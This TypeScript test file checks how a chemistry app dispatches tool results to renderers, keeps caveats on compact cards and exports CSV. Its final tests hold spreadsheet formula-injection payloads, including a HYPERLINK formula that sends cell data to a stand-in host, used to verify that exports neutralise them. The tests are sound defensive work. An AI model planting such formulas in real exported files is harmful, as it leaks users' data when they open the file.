/**
 * Which renderer draws a result, and what a compact one is allowed to leave out.
 *
 * The dispatch is keyed on the payload's **shape** wherever a shape exists to key on, and that is
 * the property worth pinning: the service registers ~56 tools and grows, so a name-keyed table
 * means every new tool is invisible until somebody writes an entry for it. These tests hand the
 * registry payloads under tool names it has never heard of, and expect the right renderer anyway.
 *
 * The second group is the one that protects a reader rather than a developer. A compact card may
 * show fewer rows; it may never drop the sentence that decides how the rows are read. An empty
 * hazard table is not a clearance, an empty hit list can mean the index is empty, and a compact
 * view that trims those to save two lines is a card that says something the full view does not.
 */

import { afterEach, describe, expect, it, vi } from 'vitest';
import { cleanup, render, screen } from '@testing-library/react';
import { rendererFor, toCsv, type ResultRenderer } from '../src/results/renderers.tsx';
import type { Json } from '../src/results/shape.ts';

vi.mock('../src/auth/AuthContext.tsx', () => ({
  useAuth: () => ({ auth: { getAccessToken: async () => null, mode: 'dev' }, ready: true }),
}));

afterEach(cleanup);

const pick = (
  tool: string,
  payload: unknown,
): { id: string; wide: boolean; data: Json; renderer: ResultRenderer } => {
  const found = rendererFor(tool, payload);
  if (!found) throw new Error('no renderer');
  return {
    id: found.renderer.id,
    wide: found.renderer.wide,
    data: found.data,
    renderer: found.renderer,
  };
};

const draw = (tool: string, payload: unknown, compact: boolean): void => {
  const found = rendererFor(tool, payload);
  if (!found) throw new Error('no renderer');
  const { renderer, data } = found;
  render(<renderer.View data={data} tool={tool} compact={compact} onUsed={() => {}} />);
};

describe('dispatch', () => {
  it('finds the hazard table by its flags, under a tool name it has never seen', () => {
    expect(pick('screen_something_new', { flags: [], screened: ['CCO'] }).id).toBe('hazard');
  });

  it('finds a fingerprint search by its hits carrying structures', () => {
    expect(pick('similar_reactions', { hits: [{ label: 'CCO>>CC=O', similarity: 0.8 }] }).id).toBe(
      'structures',
    );
  });

  it('does not claim a hits list of something that is not a structure', () => {
    // A job listing has hits too. Claiming it would draw a grid of failed depictions where a
    // table belongs.
    expect(pick('find_past_jobs', { hits: [{ job_id: 'calc-1', kind: 'calc' }] }).id).toBe('table');
  });

  it('reads an empty fingerprint result only when it carries the search’s own flags', () => {
    // The empty hit list is the dangerous one — "the index is empty" and "no analogue exists"
    // arrive identically — so it is only claimed when `index_empty` says which search this was.
    expect(pick('similar_molecules', { hits: [], index_empty: true }).id).toBe('structures');
    expect(rendererFor('anything', { hits: [] })).toBeNull();
  });

  it('finds a series by a run of numbers, and names it by the key the service chose', () => {
    // A tool name the registry has never heard of, which is the point of the shape dispatch and
    // deliberately not `campaign_progress` — that one now has a typed renderer of its own, so
    // using it here would have tested the name-keyed path while claiming to test the shape one.
    const picked = pick('yield_over_time', { running_best: [41, 52, 58, 63, 71] });
    expect(picked.id).toBe('series');
  });

  it('gives the three campaign shapes their own renderers, by name', () => {
    // Keyed on tool name deliberately: a plateau reading, a batch of proposals with a Pareto front
    // and a prediction with an in-domain flag share no field worth dispatching on. Each carries one
    // fact a generic table loses — the assay noise the gains are read against, a front with no
    // single best point, and a number produced by extrapolating.
    expect(pick('campaign_progress', { best_so_far: [1, 2, 3] }).id).toBe('campaign');
    expect(pick('suggest_next_experiment', { candidates: [] }).id).toBe('proposals');
    expect(pick('predict_outcome', { predicted_value: 82, in_domain: false }).id).toBe(
      'prediction',
    );
  });

  it('says an extrapolated prediction is extrapolated, in the header', () => {
    // The one fact the number cannot carry on its own: a prediction outside the space the surrogate
    // was fitted on reads identically to one inside it.
    const outside = pick('predict_outcome', { predicted_value: 82, in_domain: false });
    expect(outside.renderer.summary?.(outside.data)?.text).toBe('extrapolated');
    const inside = pick('predict_outcome', { predicted_value: 82, in_domain: true });
    expect(inside.renderer.summary?.(inside.data)).toBeNull();
  });

  it('withholds a plateau verdict the service withheld', () => {
    // The backend computes `plateaued` as `enough and since >= window`, so on two runs it is
    // `false` — and a chip reading "still improving" there would answer a question the service
    // explicitly declined. Three states, never two.
    const few = pick('campaign_progress', { enough_observations: false, plateaued: false });
    expect(few.renderer.summary?.(few.data)?.text).toBe('too few runs to say');
    const done = pick('campaign_progress', { enough_observations: true, plateaued: true });
    expect(done.renderer.summary?.(done.data)?.text).toBe('plateaued');
  });

  it('finds an experiment protocol by its receipt, under a tool name it has never seen', () => {
    // `renderer.id` IS the value `ResultBlock` stamps as `data-result-block`, so asserting it here
    // is asserting the block a browser test then looks for by that attribute (`e2e/protocols.spec.ts`).
    //
    // Three fields together, because each alone is common: `design_id` would claim anything naming
    // a design, `checks` anything that validates, and `summary` half the payloads in this app.
    expect(
      pick('draft_a_protocol_somehow', {
        design_id: 'design-0123456789ab',
        summary: '4 arms across 2 factors.',
        checks: [],
        blocking: [],
      }).id,
    ).toBe('protocol');
  });

  it('does not let a protocol receipt fall through to the generic table', () => {
    // Without its own entry a receipt matched `table`, which finds `checks` first and draws the
    // check list as though it were the result — the arms, the factors and the link to the document
    // all absent, with nothing on screen saying anything had been left out.
    const picked = pick('read_experiment_protocol', {
      design_id: 'design-0123456789ab',
      summary: '2 arms.',
      checks: [{ check_id: 'charge-complete', severity: 'note', passed: true, detail: 'ok' }],
      blocking: [],
      arms: [{ arm_id: 'A1', well: 'A1', run_order: 1, levels: {} }],
    });
    expect(picked.id).toBe('protocol');
    expect(picked.wide).toBe(true);
  });

  it('separates a blocking check from a check that merely failed, and from no checks at all', () => {
    // `blocking` is the service's own subset of the failed checks that stop execution. Collapsing
    // the two would either alarm on a note or stay quiet on a blocker — and zero checks is the
    // absence of a finding, not a clean one, so it is neither.
    const blocked = pick('draft_experiment_protocol', {
      design_id: 'design-0123456789ab',
      summary: 's',
      checks: [{ check_id: 'a', severity: 'blocker', passed: false, detail: 'd' }],
      blocking: ['a'],
    });
    expect(blocked.renderer.summary?.(blocked.data)).toEqual({
      text: '1 blocking',
      tone: 'danger',
    });

    const warned = pick('draft_experiment_protocol', {
      design_id: 'design-0123456789ab',
      summary: 's',
      checks: [
        { check_id: 'a', severity: 'warning', passed: false, detail: 'd' },
        { check_id: 'b', severity: 'note', passed: true, detail: 'd' },
      ],
      blocking: [],
    });
    expect(warned.renderer.summary?.(warned.data)).toEqual({
      text: '1 of 2 failed',
      tone: 'warn',
    });

    const none = pick('draft_experiment_protocol', {
      design_id: 'design-0123456789ab',
      summary: 's',
      checks: [],
      blocking: [],
    });
    expect(none.renderer.summary?.(none.data)).toEqual({
      text: 'no checks recorded',
      tone: 'neutral',
    });
  });

  it('finds a value strip only when there is no record list to tabulate', () => {
    expect(pick('predict_pka', { pka: 4.76, sd: 1.6 }).id).toBe('values');
    // A payload with both is a table with a header, not a strip.
    expect(pick('predict_pka', { pka: 4.76, sites: [{ atom: 3, pka: 4.76 }] }).id).toBe('table');
  });

  it('wraps a bare top-level list so every renderer can assume an object', () => {
    const picked = pick('find_notes', [{ id: 'note-1' }, { id: 'note-2' }]);
    expect(picked.id).toBe('table');
    expect(picked.data).toEqual({ items: [{ id: 'note-1' }, { id: 'note-2' }] });
  });

  it('has nothing to say about a payload with no structure in it', () => {
    expect(rendererFor('anything', { note: 'a sentence' })).toBeNull();
    expect(rendererFor('anything', 'just text')).toBeNull();
  });

  it('reads a screening design as a run sheet, in the order it was given', () => {
    // The order IS the data — a design randomises its run order deliberately — so the rows are
    // numbered as they arrive rather than invited to be sorted.
    const picked = pick('generate_screening_design', {
      runs: [
        { temperature: 40, equivalents: 1.1 },
        { temperature: 80, equivalents: 1.1 },
      ],
    });
    expect(picked.id).toBe('runsheet');
  });

  it('summarises a payload with what it says, never with a judgement', () => {
    const hazard = rendererFor('screen_hazards', {
      flags: [{ severity: 'high' }, { severity: 'low' }],
    });
    expect(hazard?.renderer.summary?.(hazard.data)).toEqual({ text: '2 · high', tone: 'danger' });

    // "no rule matched", never "clear": the difference between them is the whole of the caveat
    // the renderer pins above the table.
    const clean = rendererFor('screen_hazards', { flags: [] });
    expect(clean?.renderer.summary?.(clean.data)?.text).toBe('no rule matched');
  });

  it('asks for the card’s full width only where a table or a grid needs it', () => {
    expect(pick('screen_hazards', { flags: [] }).wide).toBe(true);
    expect(pick('predict_pka', { pka: 4.76 }).wide).toBe(false);
  });
});

describe('a compact card keeps every sentence that qualifies the data', () => {
  it('keeps the hazard caveat when it drops rows', () => {
    const flags = Array.from({ length: 6 }, (_, i) => ({
      rule_id: `rule-${i}`,
      severity: 'high',
      explanation: 'why',
      citation: 'somewhere',
      matched: 'CCO',
    }));
    draw('screen_hazards', { flags }, true);

    // Matched on a contiguous clause: the sentence contains a <strong>, so a regex spanning it
    // would fail on the markup rather than on the meaning.
    expect(screen.getByText(/rules cover known motifs/i)).toBeTruthy();
    // Said out loud rather than left to the reader to notice, so a card can never be mistaken for
    // the whole result.
    expect(screen.getByText(/3 of 6 shown/)).toBeTruthy();
  });

  it('keeps the empty-index banner, which is the reading rather than the data', () => {
    draw('similar_molecules', { hits: [], index_empty: true, subject: 'compound' }, true);
    expect(screen.getByText(/was not answered/i)).toBeTruthy();
  });

  it('keeps the protocol’s structural caveat, and says the service trimmed the arms', () => {
    // Two different subtractions and a card needs both. `Trimmed` reports what THIS view dropped;
    // `arms_omitted` reports what the service dropped before the card ever saw it — and a reader
    // who only knew about the first would still be short. The caveat is what stops "no blockers"
    // being read as "safe to run": these checks read the document, not the chemistry.
    draw(
      'draft_experiment_protocol',
      {
        design_id: 'design-0123456789ab',
        revision: 2,
        status: 'draft',
        summary: '96 arms across 3 factors.',
        checks: [],
        blocking: [],
        factors: { solvent: ['2-MeTHF', 'CPME'] },
        arm_count: 96,
        arms_omitted: 90,
        arms: Array.from({ length: 6 }, (_, i) => ({
          arm_id: `A${i + 1}`,
          well: `A${i + 1}`,
          run_order: i + 1,
          levels: { solvent: '2-MeTHF' },
        })),
      },
      true,
    );

    expect(screen.getByText(/checks are structural/i)).toBeTruthy();
    expect(screen.getByText(/4 of 6 shown/)).toBeTruthy();
    expect(screen.getByText(/90 more are in the design itself/)).toBeTruthy();
    // The way out of the card, which is the only thing that makes six of ninety-six honest.
    expect(screen.getByRole('link', { name: /Open the full protocol/ }).getAttribute('href')).toBe(
      '/protocols/design-0123456789ab',
    );
  });

  it('keeps the unresolved-species alert on a charge table', () => {
    draw(
      'stoichiometry_table',
      {
        basis_name: 'aryl bromide',
        basis_mass_g: 10,
        unresolved: ['the ligand we call L7'],
        rows: [{ name: 'aryl bromide', role: 'basis', mass_g: 10 }],
      },
      true,
    );
    expect(screen.getByText(/the ligand we call L7/)).toBeTruthy();
  });
});

describe('the CSV a chemist opens in Excel', () => {
  it('quotes by RFC 4180 and doubles an embedded quote', () => {
    expect(toCsv(['name', 'note'], [{ name: 'THF, dry', note: 'he said "no"' }])).toBe(
      'name,note\r\n"THF, dry","he said ""no"""',
    );
  });

  it('neutralises a cell a spreadsheet would run as a formula', () => {
    // Excel, LibreOffice and Sheets all evaluate a cell beginning `=`, `+` or `@`. Every string in
    // these tables came from outside the browser — a solvent name the corpus was asked about, a
    // reagent on a run sheet — and the payload is a tool result, not a constant. The classic form
    // is `=HYPERLINK("http://…"&A1)`, which runs when the chemist opens the file rather than when
    // anyone reviews it. Quoting does not help: `"=cmd|…"` evaluates identically.
    const csv = toCsv(
      ['name'],
      [{ name: '=HYPERLINK("http://x/"&A1)' }, { name: '+1' }, { name: '@SUM(A1)' }],
    );
    for (const line of csv.split('\r\n').slice(1)) {
      expect(line.replace(/^"/, '').startsWith("'")).toBe(true);
    }
  });

  it('leaves a negative number alone, because every table here has some', () => {
    // The prefix is a real cost — it changes the value a spreadsheet reads — so it is spent only
    // where there is a formula to stop. `-40` is a temperature.
    expect(toCsv(['t'], [{ t: -40 }])).toBe('t\r\n-40');
    // A leading `-` in front of something that is not a number is a different matter.
    expect(toCsv(['t'], [{ t: '-1+1e1*A1' }])).toBe("t\r\n'-1+1e1*A1");
  });
});
